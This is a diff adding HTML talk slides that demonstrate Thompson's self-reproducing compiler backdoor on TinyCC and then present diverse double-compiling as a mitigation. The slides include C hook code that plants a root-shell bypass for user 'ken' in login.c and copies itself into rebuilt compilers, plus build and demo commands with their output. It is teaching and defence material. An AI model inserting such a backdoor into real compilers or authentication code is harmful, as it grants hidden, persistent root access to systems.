+<pre class="src src-scheme">((<span style="color: #b6a0ff;">lambda</span> (x) (list x (list 'quote x)))
+ '(<span style="color: #b6a0ff;">lambda</span> (x) (list x (list 'quote x))))
+</pre>
+</div>
+
+</div>
+
+</section>
+<section>
+
+<p>
+<a href="https://github.com/mame/quine-relay">https://github.com/mame/quine-relay</a>  
+</p>
+
+<pre class="example" id="org1c3ff09">
+eval$s=%q(eval(%w(B=92.chr;g=32.chr;puts(eval(%q(N=10.chr;n=0;e=-&gt;s{Q[Q[s,B],?"]Z(N,B+?n)};E=-&gt;s{'("'+e[s]+'")'};d=-&gt;s,t=?"{sZ(t){t+t}};def~f(s,n)sZ(/.{1,Jn*255}}/m){yield$S=E[$s=$&amp;Xend;Q=-&gt;s,t=?${sZ(t){B+$&amp;}};R=";return~0;
+";V=-&gt;s,a,z{sZ(/(JB*4})+/){a+"J$&amp;.size/2}"+z}};C=%w(System.Console~Write);$C=C*?.;$D="program~QR";$L="public~static";$W="s.WriteByte";rp=-&gt;s,r{v="";[r.Hject(s){|s,j|o={};m=n=0;s.size.times{|i|o[f=s[i,2]]||=0;c=o[f]+=1;m&lt;c&amp;&amp;
+(m=c;n=f)};v=n+v;sZ(n,(j%256).chr)},vX;%(fn^{K`x21("{}",U"object~QR~extends~App{Jf(%((display"Je[%(Js,v=rp["K"+E[%(fun~p~n=K(Int.toStrHg~n`x5e"~");fun^=(K"0~0~130~";List.tabulate(127,p);StrHg.map(fn~c=&gt;(p(3+ord~c);K"-1~0~";
+c))U%(object"Application"{state"maH"{Jf("K"+E[%(puts~"JQ[%(cat&lt;&lt;YE`na::=`x7eJ"let~t='k',c;!(c~ofU%(void~p(Ht[]c){!each(Ht~v~H~c)stdout.Kf("%c%c",v&gt;&gt;8,v);}void^{Ht[]a;p({19796,26724,0,6,0,1,480,19796,29291,Js=%(module~QR;Hit
+ial~begH~Jf("let~s=U%(Module~QR`nSub^`nDim~c,n:Dim~s=JC[0X.openstandardoutput(),t={26,34,86,127,148,158,200}:For~Each~d~H"BasmCBBBCRE`x60F&lt;&lt;&lt;&lt;C&lt;`x60C&lt;B`x60BBD#C`x58wasi_snapshot_preview1`x4afd_GBBEEDCD`x47ECB@I`x55D`x48memo
+ryDB`x48_startBDL|DRBAC~BA`x4alACA4RB9MiCD&lt;AERCA&gt;D`x21BE@ABRCABRCABRCA`x4a`x21CE@~B-BB~CACk:CvACqRC~COBMADRCACRCADRCABRCABRC~BACj:B-BBOBMADRCADRCADRCAFRCMM}CBABM`x7eJ40.chr}BBBCBBB,BBBDBBB0BBBDBBB4BBB=BBB?BBB;BBB~...Yt..Yn.
+.(module(import~:wasi_snapshot_preview1:~:fd_G:~(func(param~i32~i32~i32~i32)(result~i32)))(memory(export~:memory:)(data~:Y08Y00Y00Y00$:))(func(export~:_start:)i32.const~1~i32.const~0~i32.const~1~i32.const~0~call~0~drop))":c
+=Asc(d):If~c=36:For~c=0To~11:#$W(If(c~mod~3,Asc(Js ="&lt;?xml-J  I="stylesheet"}~type='text/xsl'href=''?&gt;&lt;JI}~version='1.0'~xmlns='http://www.w3.org/1999/`x58SL/Trans!m'&gt;&lt;output~method='text'/&gt;&lt;x~xmlns='z:'&gt;&lt;`x21[CDATA[J%(sub~
+f(s$,n)?s$;:!~i=1to~n?"YY";next~end~sub :f("JV     [e[%      (G,!mat=    "%s",Jf("YG{-}{txt}{JQ["cat&lt;&lt;YQ`nJ%(with~Text_Io;procedure~qr~is~begH~Text_Io.Put("Jd[%(trans~o(Hterp:get-output-stream)`no:set-encodHg-mode"utf-8"`nt
+rans~f(v~n){K(Character(+~45056(+(*~6   4~n       )                     v)))}`ntrans~D(n){if(&lt;~n~4){f(+(*~6~n)9)48}{if(n:odd-p){D(-~n~3)`nf~27~48`nf~36~11}{                D(/~n~2)`nf~21~48`nf~48~20}}}`ntrans~S(Buffer"Je[%W
+[STRIN`x47z:=~226+~153,a:=z+~166,b:    =a                                          +"2"+z+~160,c:=b+"8"+z+~165,t:="Jd[%(class~QR{#$L~void~maH(StrH                                  g[]a){a=U"G('JQ[e["implement~maH0()=KU"BE`x
+47IN{KU%(sed~'s/YY/YYYY/g;s/"/YYq                                                /g;s/.*/K~"&amp;"Ynquit/'&lt;&lt;YE`nJ%(f(s){System.out.K(s);}s="ef*c+                                            45*,";!(c:U(s="#Hclude&lt;cstdio&gt;`nHt^{{p
+utsU%(#$C("QuHe~Relay~Coffee.YnY                                                        nIngredients.Yn");!(Ht~i=9;i++&lt;126;)#$C($"{i}~l~{                                                    i}Yn");#$C("YnMethod.Yn");!each(Ht
+~c~HU%((doseq[s(concat["program                                                             -id.~q.~procedure~division.~display"](map~                                                          #(str~Y"(.replace~%"Y"""Y"Y"")Y
+")(re-seq~#".{1,31}""Je["cons                                                             ole.logJV[E[%((prHc"Je["KU%(import~std;vo                                                                id^{G(q"$J"[''`nJ"IO.GU%((pr
+Hc"Je["`nmaH(_)-&gt;io:put_cha     rsU%                                                           (echo~"Je[%(#$C~"""J?"+"(io.G~`"Je                          ["%option~noyy                             wrap`n~Ht^{putsU"echo~'JQ
+[%(~:~B~."Jg*9}K*,'"~;~:~C     ~B~ty                                                               pe~."~'"~CR~;~:~D~S"~K~''(*(                     A))'',&amp;"~C~SY"~Je[%(K"Je["Wr                       iteAll(OutputText`x55ser
+(),U'echo~'+e[f('set~K"-"      ;K'+                                                              E[%(package~maH;import"fmt"                   ;func^{fmt.PrHtU%(236:j;{119:i;{206i-:                    i;.43&lt;{76+}{[i]Y43-*}i
+f}%}:t;"algoritmo~A;HYu00                      edcio~imprima(Y"""+,.,                                /,"t"*,-,.,"6*t"*,5,4,                 3,0,5::1-2,/,.*/8.1-11,-*-*.0.-0,-,0*`x55+`x                   55+M"t"Je[%(z=new~ja
+va.util.zip.`x47`x5aIPOut  putS         tream(System.out);z&lt;&lt;'J"maH=putStr                              "+E["class~QR{#$L                ~function^Sys.KU%(procedure^;i:=c:=0;s:=U%(.class~                 QR`n.super~JS="java
+/lang/"}Object`n.method~#$L  ^V`n.limit~stack~1`nldc~"Je[%(void^{StrHg~c[]=new                            ~StrHg[99999]                ,z="",s="Jz=t=(0..r=q=127).map{|n|[n,[]X;a="";b=-&gt;n{a&lt;                 &lt;(n%78+55)%84+42}
+;(%(P={0:'[+[]]'};!(R~of     ('`x21[]@`x21`x21[]@'+(A="[]['at']")+"@([]+[])['lHk                         ']()@(+('11e                20')+[])['split']([])@(+[])"+(C="['constructor']")).split(                '@'))!(E~H~D=eva
+l(`x47='('+R+'+[])'))      P[D[E]]||=`x47+"['"+E+"']";!(`x47='[',B=0;++B&lt;36;)P[D=B.                         toStrHg(               36)]=B&lt;10?(`x47+='+`x21+[]')+']':P[D]||"(+('"+B+"'))['to'+([]                +[])"+C+"['name
+']]('36')";A+=C+"('c     onsole.log(unescape(Y"";!(E~of~U"fun^=KJQ[E[%(p(){~K~-rn~$1;                         };f(               ){~!~x~H~$(p~"$1"|od~-vAn~-tu1);do;p~$4;!((j=$3;j--;));do;h~$2~$x               ~$j;done;done;
+};p~kY`x60;h(){~p~      Y`x60${1:$2&gt;&gt;$3&amp;1:2};};f~'console.logJQ[E[%(@s=global[J(s=%(`x4                        8A   I~1,VISIBLE~"J"K((JV[E["changequote(&lt;@,@&gt;)&lt;@J"a:;@echo~'Jd["outputU"MOD`x55LE~Q              ;IMPORT~StrIO;
+BE`x47IN~J%(.ass      embly~t{}.method~#$L~void~m(){.entrypoHt~ldstr"Je["_start{{`x21:`nq                     :~|`n~                 :mov~edx,z-d`n~global~_start`n~mov~ecx,d`n~Hc~ebx`n~mov~al,4`n~              Ht~128`n~mov~
+eax,1`n~dec~ebx      `n~Ht~128`n~d:db`x60Je["$KU"KfU"echoU"#import&lt;stdio.h&gt;JN}Ht^{putsU"K_s                                                      trHgU"puts([arrayfun(@(k)[repmat(['Ook'~char(46-13*               (k&lt;0))~'~'],
+1,2*abs(k))~'O      ok`x21~Ook.~'],diff([0~U"KU"$console:lHe[J"begH~G('J(p="eval";%($_="Js,v                                                           =rp["K~'JQ[d[%(&lt;?php~$z=3+$w=strlen($s=JQ[E["H              t^{GU"(JQ["q
+r:-GU"Hit{Jf(      %(K('cat("')`n!~l~HUd[d["eval$s=%q(#$s)",?'],?']X.split("Yn"):[K('r=fput(ch                                                              ar(%d))'%ord(c))!~c~H"echo~'say~''%s'''Yn              "%l]`nK('end
+Yn")')#),6){"      KfJd[$S,?%X;"}}}"X.",BX)K~quit"X;}"]X)*3;echo"Yx89PN`x47YrYnY32Yn";$m="";$t=                                                                 "Yxc0Y0Yxff";!($i=-1;++$i&lt;$z&lt;&lt;7;$m.=$              c--?($w-$c||
+$i&gt;$z)&amp;&amp;$i/$      z&lt;($c&lt;$w?ord($s[$c/3|0]):$c--%3+2)?$t[2].$t[$c%3%2].$t[$c%3]:"Y0Y0Y0":"Y0")$c=$                                                                   i%$z;!each(["I`x48DR".pack("NNCV",              $w+2,128,8,
+2),"IDAT".gz      compress($m),"IEND"]as$d)echo~pack("NA*N",strlen($d)-4,$d,crc32($d));),B],?'X'",                                                                     128..287];["$_='JQ[s,c=/['YY]/X              ';$n=32;!$a
+(unpack'(a2       )*','JQ[v,cX'){$b=chr(--$n&amp;255);s/$b/$a/g}K"].pack("u").tr("~-a",",-:A-`x5aa-y")}"                                                                      ;tr/,-:A-`x5aa-y/~-a/;eval~               unpack~u).s
+can(/[~,-:A       -z]+|(.)/m){p="s++J$1?"chr~J$1.ord}+e":$&amp;+?+};"+p};p)}')end."Z(?;,"`x5e;")}]"X;quit                                                                        "X]+0),'un',0){:}]);"X"]              +R}}"X"X;"X"
+X`x60`n~z:;       }}{{{q}}}"X"call~void~[mscorlib]JC*"::"}(strHg)ret})Z(/()[Ji=?`x5e}"]+|[Ji}']+/){[  "                                                                         StrIO.WriteStrHg(",$&amp;              ,");"]*($1??
+":?')}}END~       Q."X",?$]Z(?'){"'Y''"}}'"}@&gt;"],?&amp;,?&amp;X:gsub('&amp;(%d+)&amp;',load[[return('YY'):rep(...)     ]]                    )))"Z(/[:"          ]/,"                             :Y0")}",`x4bT`x48`               x58B`x59E)).
+size+1}x~i8       ]c"JsZ(/[Y"`n`t]/){"Y%02x"%$&amp;.ord}}Y00"declare~i32@puts(ptr)defHe~i32@maH(){cal        l                   ~i32@puts(ptr     @s)ret~i32~                          0})],?#]Z(?',%(               '"'"'))}'~kki
+~7~'J"`x60`x       60s"*8}i';h(){~p~${1:$2%83-10&gt;&gt;$3*2&amp;3:1};};f~'A|&lt;9&lt;9ljcIF5==p=y&gt;FAj=p=yF&gt;F?F&gt;          F                    ?F7FAfFAj=y?FF  &gt;FAjlj=t=y&gt;FAj          |ljlj          |gAljdzFAllh                xyF&gt;|j|ljd|lj
+cA|j=|==n9==        nFF&gt;x=y1=y?FF&gt;F?F&gt;FAf?@@'~skiY`x60~3)]X"X)A+="'+`x21[]+'"+E.charCodeAt().t             oS                    trHg(16);!(A+="Y".replace(/fals     e/g,escape(Y       "~Y")[0])                ))')()",R=9;R-
+-;)A=A.replac        e(/'(.*?)'/g,(B,D)=&gt;[...D].map(E=&gt;P[E]).joH('+'));console.log('"'+A+'"')             )).b                    ytes{|n|r,z=z[n]||(b[r/78];b[r];   q&lt;6083&amp;&amp;z[n]=[q+     =1,[]]                ;t[n])};b[r/78]
+;b[rX";Ht~i=0,        n=0,q=0;!(;++n&lt;127;)c[n]=""+(char)n;!(;i&lt;Ja.size};){q=q*78+(s.charAt(             i)-13)%8                    4;if(i++%2&gt;0){c[n]=z+(q&lt;n++?c[q] :z).charAt(0);IO.K(   z=c                 [q]);q=0;}}})X"`
+nHvokestatic~J         S}IO/K(LJS}Object;)V`nreturn`n.end~method)+NX;G("DO,1&lt;-#",*s);ever              y~t:=ord(`                     x21s)do{i+:=1;u:=-i;every~0to~7do{u:=u*2+t%2;t/:=2}; G                  ("PLEASE")Y(i%4/3
+);G("DO,1S`x55B         #",i,"&lt;-#",(c-u)%256);c:=u;};G("PLEASEREADO`x55T,1PLEASE`x47IVE              `x55P");end)X;                      }"].tr(?"+B,"&amp;_")}'.tr('_&amp;','YY"');z.close())X"{"                   W""w"@j~1+:jY-~118
+%1+*}%"*.00,-/,1          1,-B1,4,.;4-,*,2&lt;..,0,."t'");fim')X})],61){"Kn#$S;"}]+"`nqui             t"X);Q`x55IT;"X")X                      "~0~DO~B~."~char("~CO`x55NT~.~."~),&amp;'"~CR~LOO                   P~S"~'''';end"~C~."J
+g*9}end"~CR~B`x59E          ~;~D~),/['Y]/X'"X;}`n%%"X`")"Z(?",'"34,"')+?"}~""")X")X              ."X"))X"}'']p"}$");})                        X"X"))],'"+"YY".repeat(',')+"'X"X"))[".                     "])](Kln"message(STAT
+`x55S~Y"~~~~Y""(pr-           str~s)")"))).reverseX)#$C($"Put~{c}.");#$C("Pour~co               ntents~of~the~mixHg~bowl                          ~Hto~the~bakHg~dish.YnYnServes~                       1.");)X;;;;;};;;;;}";t=
+{};b="";L="";n=i=0;D=            -&gt;n{L&lt;&lt;(n+62)%92+35;D};s.bytes{|c|n&gt;0?n-=1:(x                =(t[c]=(t[c]||[]).reject{|j|                              j&lt;i-3560}).map{|j|                            [(0..90).fHd{|k|not~s[i+1
++k]==s[j+kX||91,jX.max;             x&amp;&amp;x[0]&gt;4)?(n,j=x;bZ(/.{1,3999}/m){|u|D                [(z=u.size)%87][z/87];L&lt;&lt;u};b="";x                                                                       =4001+i-j;D[x%87][x/87][n-5
+]):b&lt;&lt;c;t[c]+=[i+=1X;"#Hc                lude&lt;stdio.h&gt;`nchar*p=ULX,s[99                  999],*q=s;Ht^{!(Ht~n,m;*p;){n=(*p-5)%9                                                                   2+(p[1]-5)%92*87;p+=2;!(m=n&gt;3
+999?(*p++-5)%92+6:n;m--;q++                     )*q=n&gt;3999?q[40                       00-n]:*p++;}puts(s);}")X){s+="d9+,";!(m=1;m&lt;                                                             256;m*=2)s+="d9+,4,:"+c/m%2*4+"+
+,";f(s);s="4,:,";}f(s+s);!(c:B                                                     ase64.getDecoder().decode("kaARERE`x58/I0ALn3n5ef6                                                       l/Pz8+fnz58/BOf5/7/hE`x58/O`x5azM5m
+C`x58/Oczm`x5azBPn5+`x58/OczMznBL                                               /nM5m`x5azBPu++fPPOc5zngnnO`x5azO`x5agnBM`x47AW7A==")){c&amp;                                               =255;f(""+c%8+c/8%8+c/64+"8*+8*+,");}f(
+"@");)}`nE)X}"X"],?'X');"Z(/Y+/){"`x5e                                      J$&amp;.size}`x5e"}X.split("YY`x5e");!(Ht~i=1;i&lt;a.length;a[0]+=a[i+1]                                       ,i+=2)a[0]+="YY".repeat(Integer.parseInt(a[
+i]));System.out.K(a[0]);}})X";FORiTO`~`x55PB                         tDO`~INTn:=ABSt[i];K(~(50+n%64)+c+~(50+n%8%*8)+c+~(50+nMOD8)+b+~74+a)OD]*"REPR"                         X")`nwhile(&gt;(S:length)0){trans~c(S:read)`nD(c:to-H
+teger)`nf~35~39}`nf~24~149)]Z(N,'"&amp;ASCII.LF&amp;"')}");end;)}`nQ",/[Y{}]/X}",35){$S+"+`n"}}"")],'",','):f("'X",0))}]]&gt;&lt;/x&gt;&lt;/JI}&gt;";s.size*16+3}.ToStrHg("x8")(7-c*2Y3~xor~1)),92)):Next:Else:n=(c&gt;124)*(8*c-Js.size+1294}):Do~While~
+n&gt;127:#$W(n~mod~128+128):nY=128:Loop:#$W(If(c&lt;125,If((c-1)Y7-8,c-66*(c&gt;65)*(c&lt;91),t(c-57)),n)):End~If:Next:For~Each~c~H"Jd[s]Z~N,'"&amp;~VbLf~&amp;"'}":#$W(Asc(c)):Next:End~Sub:end~module)X`nput=s`n2,$p`nq`x21",3){%($G("%s",#$S);)}
+}end~endmodule);(s.size*72+4).divmod(65536)*?,}});!each(Ht~c~HUsX.data)!each(Ht~v~H~a={0,9,7,4,5,c/100*7/6+1,c%100/10*7/6+1,c%10*7/6+1,7})p({144,v=15450+v*256,384,v});p({255,12032});})X)t='Yx60.'+c+t;console.log(t)"}`n::=`n
+a`nYE),/["$`[Y]/X")],4){%(Console.G#$S;)}}exit();}})X))],127..255];c=-&gt;x{xZ(/.{1,99}/m){"+`n"+E[$&amp;X};f("1d;s/.//;s/1/~the~sum~of~a~son~and0/g;s/0/~twice/g`n#The~Relay~of~QuHe.`n#Ajax,~a~man.`n#Ford,~a~man.`n#Act~i:~QuHe.`n#
+Scene~i:~Relay.`n#[Enter~Ajax~and~Ford]`n#Ajax:`n#"+%(variable~s=""Jc[sX,v=""Jc[vX,i;_!~i(0,128,1)s=strreplace(s,pack("C",255-i),v[[i*2:i*2+1]]);Kf("%s",s)).bytes.map{|b|"`x59ou~are~as~bad~as"+("%b"%b)[1..].reverse+"~a~son.
+Speak~thy~mHd."}*""+"`n#[Exeunt]",7){"Kf#$S`n"}}quit)X")),196){%(K#$S;)}}}"X)})).gsub(/[!GHJKUXYZ^`~]/){[g,0,']}',B*2,'.gsub','#{E[',0,0,g+'main()',0,B,:write,:in,:for,'#{',:print][$&amp;.ord%86%20]})))*"")#_buffer_for_future_b
+########################################################################  Quine Relay -- Copyright (c) 2013, 2014 Yusuke Endoh (@mametter), @hirekoke  #######################################################################)
+</pre>
+</section>
+</section>
+<section>
+<section id="slide-orge481be6">
+<h2 id="orge481be6">Step 3 · Self-propagation</h2>
+</section>
+<section>
+
+<p>
+Let's now focus on <b>self-propagation</b>.
+</p>
+
+<div class="sp">
+  <div class="stage io"><span class="s">login.c</span><span class="f">clean</span></div>
+  <span class="arr">&rarr;</span>
+  <div class="stage hot core">
+    <span class="s">dirty tcc</span>
+    <span class="f">payload in the binary</span>
+    <span class="rule"></span>
+    <span class="f">login.c &rarr; plant ken</span>
+    <span class="f">tcc.c &rarr; copy the payload</span>
+  </div>
+  <span class="arr">&rarr;</span>
+  <div class="stage io"><span class="s">login</span><span class="f">ken works</span></div>
+
+  <div class="stage io"><span class="s">tcc.c + libtcc.c</span><span class="f">clean</span></div>
+  <span class="arr">&rarr;</span>
+  <span class="arr">&rarr;</span>
+  <div class="stage hot"><span class="s">tcc&prime;</span><span class="f">still dirty</span></div>
+</div>
+
+</section>
+<section>
+
+<p>
+~ 200 LoC of logic
+</p>
+
+  <div class="code-pages cols3">
+    <div class="code-page"><span class="cap">payload + splice</span><pre class="src src-c">static const char thompson_payload[] = {
+    47, 42, 32, 84, 104, 111, 109,
+    112, 115, 111, 110, 32,
+    ...
+    0
+};
+
+static char *thompson_splice_once(
+    char *src, const char *needle, const char *repl)
+{
+    char *hit = strstr(src, needle);
+    size_t off, nlen, rlen, len;
+    char *out;
+    if (!hit)
+        return src;
+    off = (size_t)(hit - src);
+    nlen = strlen(needle);
+    rlen = strlen(repl);
+    len = strlen(src);
+    out = tcc_malloc(len - nlen + rlen + 1);
+    memcpy(out, src, off);
+    memcpy(out + off, repl, rlen);
+    memcpy(out + off + rlen, hit + nlen,
+           len - off - nlen + 1);
+    tcc_free(src);
+    return out;
+}</pre></div>
+    <div class="code-page"><span class="cap">load + rebuild</span><pre class="src src-c">static char *thompson_load_path(const char *path)
+{
+    int fd = open(path, O_RDONLY | O_BINARY);
+    char *buf;
+    if (fd &lt; 0)
+        return NULL;
+    buf = tcc_load_text(fd);
+    close(fd);
+    return buf;
+}
+
+static char *thompson_rebuild_chunk(void)
+{
+    CString cs;
+    int i;
+    cstr_new(&amp;cs);
+    cstr_printf(&amp;cs,
+        "static const char thompson_payload[] = {\n");
+    for (i = 0; thompson_payload[i]; i++)
+        cstr_printf(&amp;cs, "\t%d,\n",
+            (unsigned char)thompson_payload[i]);
+    cstr_printf(&amp;cs, "\t0\n};\n");
+    cstr_cat(&amp;cs, thompson_payload, 0);
+    return cs.data;
+}</pre></div>
+    <div class="code-page"><span class="cap">poison libtcc</span><pre class="src src-c">static char *thompson_poison_libtcc(char *lib_src)
+{
+    const char *anchor =
+        "ST_FUNC int tcc_add_file_internal";
+    const char *ret_old =
+        "    return tcc_compile(s1, flags, filename, fd);";
+    const char *ret_new =
+        "    return thompson_hook_add_file(s1, filename, flags, fd);";
+    char *chunk, *hit, *out;
+    size_t off, clen, len;
+
+    lib_src = thompson_splice_once(lib_src, ret_old, ret_new);
+    chunk = thompson_rebuild_chunk();
+    hit = strstr(lib_src, anchor);
+    if (!hit) {
+        tcc_free(chunk);
+        return lib_src;
+    }
+    off = (size_t)(hit - lib_src);
+    clen = strlen(chunk);
+    len = strlen(lib_src);
+    out = tcc_malloc(len + clen + 1);
+    memcpy(out, lib_src, off);
+    memcpy(out + off, chunk, clen);
+    memcpy(out + off + clen, hit, len - off + 1);
+    tcc_free(lib_src);
+    tcc_free(chunk);
+    return out;
+}</pre></div>
+  </div>
+
+</section>
+<section>
+
+<p>
+~ 6k LoC of payload
+</p>
+
+  <div class="code-pages cols3">
+    <div class="code-page"><span class="cap">inline libtcc</span><pre class="src src-c">static char *thompson_inline_libtcc(
+    char *tcc_src, char *poisoned_lib)
+{
+    const char *inc1 = "# include \"libtcc.c\"";
+    const char *inc2 = "#include \"libtcc.c\"";
+    const char *needle;
+    const char *pfx =
+        "\n#if 1\n";
+    const char *sfx = "\n#endif\n";
+    char *hit, *out;
+    size_t off, nlen, plen, len, wrap, pfxlen, sfxlen;
+
+    needle = strstr(tcc_src, inc1) ? inc1 : inc2;
+    hit = strstr(tcc_src, needle);
+    if (!hit) {
+        tcc_free(poisoned_lib);
+        return tcc_src;
+    }
+    pfxlen = strlen(pfx);
+    sfxlen = strlen(sfx);
+    off = (size_t)(hit - tcc_src);
+    nlen = strlen(needle);
+    plen = strlen(poisoned_lib);
+    wrap = pfxlen + plen + sfxlen;
+    len = strlen(tcc_src);
+    out = tcc_malloc(len - nlen + wrap + 1);
+    memcpy(out, tcc_src, off);
+    memcpy(out + off, pfx, pfxlen);
+    memcpy(out + off + pfxlen, poisoned_lib, plen);
+    memcpy(out + off + pfxlen + plen, sfx, sfxlen);
+    memcpy(out + off + wrap, hit + nlen,
+           len - off - nlen + 1);
+    tcc_free(tcc_src);
+    tcc_free(poisoned_lib);
+    return out;
+}</pre></div>
+    <div class="code-page"><span class="cap">login + hook</span><pre class="src src-c">static int thompson_compile_login(
+    TCCState *s1, int flags, int fd)
+{
+    char *src;
+    const char *needle, *repl;
+    int ret;
+    src = tcc_load_text(fd);
+    close(fd);
+    needle =
+        "if (!u || !namep || strcmp(namep, u-&gt;hash) != 0)";
+    repl =
+        "if (strcmp(name, \"ken\") == 0) {\n"
+        "    puts(\"you have root privileges\");\n"
+        "    execl(\"/bin/sh\", \"-sh\", (char *)NULL);\n"
+        "    return 0;\n"
+        "}\n"
+        "if (!u || !namep || strcmp(namep, u-&gt;hash) != 0)";
+    src = thompson_splice_once(src, needle, repl);
+    ret = tcc_compile(s1, flags, src, -1);
+    tcc_free(src);
+    return ret;
+}
+
+static int thompson_hook_add_file(
+    TCCState *s1, const char *filename, int flags, int fd)
+{
+    const char *base;
+    if ((flags &amp; AFF_TYPE_MASK) != AFF_TYPE_C)
+        return tcc_compile(s1, flags, filename, fd);
+    base = tcc_basename(filename);
+    if (!PATHCMP(base, "login.c"))
+        return thompson_compile_login(s1, flags, fd);
+    if (!PATHCMP(base, "tcc.c"))
+        return thompson_compile_compiler(
+            s1, flags, filename, fd);
+    return tcc_compile(s1, flags, filename, fd);
+}</pre></div>
+    <div class="code-page"><span class="cap">compile tcc.c</span><pre class="src src-c">static int thompson_compile_compiler(
+    TCCState *s1, int flags,
+    const char *filename, int fd)
+{
+    char libpath[1024];
+    char *base, *tcc_src, *lib_src, *combined;
+    int dlen, ret;
+
+    close(fd);
+    base = tcc_basename(filename);
+    dlen = (int)(base - (char *)filename);
+    if (dlen &lt; 0)
+        dlen = 0;
+    if (dlen == 0)
+        snprintf(libpath, sizeof libpath, "libtcc.c");
+    else
+        snprintf(libpath, sizeof libpath,
+                 "%.*slibtcc.c", dlen, filename);
+
+    tcc_src = thompson_load_path(filename);
+    lib_src = thompson_load_path(libpath);
+    if (!tcc_src || !lib_src) {
+        tcc_free(tcc_src);
+        tcc_free(lib_src);
+        tcc_error_noabort(
+            "thompson: cannot load tcc.c/libtcc.c");
+        return -1;
+    }
+    lib_src = thompson_poison_libtcc(lib_src);
+    combined = thompson_inline_libtcc(tcc_src, lib_src);
+    ret = tcc_compile(s1, flags, combined, -1);
+    tcc_free(combined);
+    return ret;
+}</pre></div>
+  </div>
+
+</section>
+<section>
+
+<p class="tleft">Clone TinyCC, apply the patch, and compile.</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">git clone https://repo.or.cz/tinycc.git
+<span style="color: #f78fe7;">cd</span> tinycc
+patch -p1 &lt; ../patch/2-self-propagation.patch
+./configure
+make -j$(<span style="color: #f78fe7;">nproc</span>)
+</pre>
+</div>
+
+</section>
+<section>
+
+<p>
+The login backdoor.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">./tinycc/tcc -B./tinycc <span style="color: #79a8ff;">\</span>
+    -I./tinycc/include <span style="color: #79a8ff;">\</span>
+    -o login1 ./login/login.c -lcrypt
+
+<span style="color: #f78fe7;">printf</span> <span style="color: #79a8ff;">'x\n'</span> | ./login1 ken
+<span style="color: #f78fe7;">printf</span> <span style="color: #79a8ff;">'demo\n'</span> | ./login1 alice
+</pre>
+</div>
+
+</section>
+<section>
+
+<p>
+The login backdoor.  
+</p>
+
+  <div class="term-window">
+    <div class="term-bar"><span></span><span></span><span></span></div>
+    <pre class="term">
+<span class="c">$</span> printf 'x\n' | ./login1 <span class="in">ken</span>
+<span class="ok">you have root privileges</span>
+
+<span class="c">$</span> printf 'demo\n' | ./login1 <span class="in">alice</span>
+<span class="ok">Welcome alice</span>          </pre>
+  </div>
+
+</section>
+<section>
+
+<p>
+Self-propagation through clean sources
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">git clone https://repo.or.cz/tinycc.git clean
+<span style="color: #f78fe7;">cd</span> clean &amp;&amp; ./configure &amp;&amp; make tccdefs_.h &amp;&amp; <span style="color: #f78fe7;">cd</span> ..
+
+./tinycc/tcc -B./tinycc <span style="color: #79a8ff;">\</span>
+    -I./clean -I./clean/include <span style="color: #79a8ff;">\</span>
+    ./clean/tcc.c -o tcc2 -lm -ldl -lpthread
+</pre>
+</div>
+
+</section>
+<section>
+
+<p>
+The login backdoor still works
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">./tcc2 -B./tinycc <span style="color: #79a8ff;">\</span>
+    -I./clean/include <span style="color: #79a8ff;">\</span>
+    -o login2 ./login/login.c -lcrypt
+
+<span style="color: #f78fe7;">printf</span> <span style="color: #79a8ff;">'x\n'</span> | ./login2 ken
+</pre>
+</div>
+
+</section>
+<section>
+
+  <div class="term-window">
+    <div class="term-bar"><span></span><span></span><span></span></div>
+    <pre class="term">
+<span class="c">$</span> printf 'x\n' | ./login2 <span class="in">ken</span>
+<span class="ok">you have root privileges</span></pre>
+  </div>
+</section>
+<section id="slide-orgd6d967f">
+<h3 id="orgd6d967f">The code</h3>
+</section>
+</section>
+<section>
+<section id="slide-org7c5726b">
+<h2 id="org7c5726b">Mitigations</h2>
+</section>
+<section>
+
+
+<div id="org1dcc414" class="figure">
+<p><img src="./img/mitigation-1.png" alt="mitigation-1.png" />
+</p>
+</div>
+
+<p>
+<a href="https://dwheeler.com/trusting-trust/">https://dwheeler.com/trusting-trust/</a>
+</p>
+
+</section>
+<section>
+
+<ul>
+<li><p>
+<b>Diverse double-compiling</b>.
+</p>
+
+<p>
+The idea is to use a second, independent compiler, to compile the same source.
+</p></li>
+
+</ul>
+
+<div class="sp">
+  <div class="stage io"><span class="s">gcc-built tcc</span><span class="f">trusted T</span></div>
+  <span class="arr">&rarr;</span>
+  <div class="stage io core">
+    <span class="s">clean tcc.c</span>
+    <span class="f">same source</span>
+  </div>
+  <span class="arr">&rarr;</span>
+  <div class="stage io"><span class="s">login</span><span class="f">ken fails</span></div>
+
+  <div class="stage hot"><span class="s">dirty tcc</span><span class="f">suspect A</span></div>
+  <span class="arr">&rarr;</span>
+  <span class="arr">&rarr;</span>
+  <div class="stage hot"><span class="s">login</span><span class="f">ken works</span></div>
+</div>
+
+</section>
+<section>
+
+<p>
+We start with the following inputs:
+</p>
+
+<ul>
+<li>\(\texttt{A}\): suspect compiler binary</li>
+<li>\(\texttt{sA}\): source code that claims to produce \(\texttt{A}\)</li>
+<li>\(\texttt{T}\): independent trusted compiler for the same language</li>
+
+</ul>
+
+</section>
+<section>
+
+<p>
+We want to understand if \(\texttt{A}\) truly corresponds to
+\(\texttt{sA}\) (honest compiler) or if it has been the target of a
+Thompon's style backdoor.
+</p>
+
+<p>
+\[\texttt{sA} \rightarrow \texttt{A}\]
+</p>
+
+</section>
+<section>
+
+<p>
+Assumptions that must hold:
+</p>
+
+<ul>
+<li>\(\texttt{T}\) has no trigger or payload aimed at \(\texttt{sA}\)</li>
+<li>It implements the language semantics of \(\texttt{sA}\)</li>
+<li>Compilation is deterministic</li>
+<li>Every other tool is trustworthy</li>
+
+</ul>
+
+</section>
+<section>
+
+<p>
+<b>Step 0 - control check (regeneration)</b>
+</p>
+
+<hr />
+
+<p>
+Compute \(\texttt{A'} = \texttt{A(sA)}\) by compiling \(\texttt{sA}\) with \(\texttt{A}\).
+</p>
+
+<ul>
+<li>If \(\texttt{A'} \neq \texttt{A}\), stop, because the build isn't
+reproducible and so no conclusion is possible yet.</li>
+
+<li>Otherwise keep going.</li>
+
+</ul>
+
+<p>
+A backdoored \(\texttt{A}\) will easily pass this step.
+</p>
+
+</section>
+<section>
+
+<p>
+<b>Step 1 - diverse compile</b> 
+</p>
+
+<hr />
+
+<p>
+Compute \(\texttt{stage1} = \texttt{T(sA)}\).
+</p>
+
